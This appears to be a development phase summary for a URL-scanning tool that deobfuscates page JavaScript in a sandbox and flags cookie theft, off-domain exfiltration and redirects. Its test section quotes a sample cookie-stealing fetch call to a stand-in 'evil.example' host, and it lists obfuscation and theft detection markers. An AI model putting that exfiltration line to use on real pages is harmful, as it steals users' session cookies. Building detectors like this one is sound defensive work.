# Phase Summary: JS Deobfuscation — SHIPPED

Goal met: obfuscated page JS is deobfuscated in a sandbox, re-scanned for hidden
signals, and reflected in the verdict — without executing attacker JS on the host.

## What shipped (5 tasks / 3 waves)

- **T1** `page-fetch.sh`: capture full inline scripts to `.cache/<hash>/scripts/`, gated on
  obfuscation markers.
- **T2** `js-deobfuscate.sh`: sandboxed webcrack runner (`--network none`, cap-drop, read-only),
  auto-builds `local-llm-webcrack`. Golden test in `test-corpus/js/`.
- **T3** `js-signals.sh`: `js_signals` extracts exfil URLs / cookie theft / redirects / crypto
  from cleartext (greps text, never executes).
- **T4** `url-analyze.sh`: gated deobfuscation escalation feeding the LLM + cache + `-D` flag.
- **T5** `verdict.sh`: off-domain exfil / redirect / crypto count as a red flag → obfuscated
  login page floors to DANGEROUS. Docs + `url-corpus.txt` DANGEROUS case.

## Key deviation (found during execution)

The obfuscator.io fixture contained **none** of the existing suspicious-JS markers
(eval/atob/hex/document.write) — so the escalation gate would never have fired on real
obfuscated pages. Added detection of obfuscator.io's hallmark hex identifiers (`_0x…`) and
`String.fromCharCode` to `page-fetch.sh`. Without this the feature would silently no-op.

## Verified

- Golden: obfuscator.io fixture → `fetch("http://evil.example/steal", {body: document.cookie})`.
- E2E: obfuscated login page → DANGEROUS (2 flags); non-login → SUSPICIOUS.
- False-positive guard: same-domain URLs / storage-access-alone add no flag; clean login → SAFE.
- Cache reuse (no re-run) + `-D` skip.

## Deferred (out of scope, noted for later)

- External `<script src>` fetching + deobfuscation (inline-only for now).
- REstringer sandboxed escalation for JS webcrack can't fully resolve.
- Skimmer-without-login (off-domain exfil but no password field) currently floors to
  SUSPICIOUS, not DANGEROUS — revisit if seen in the wild.
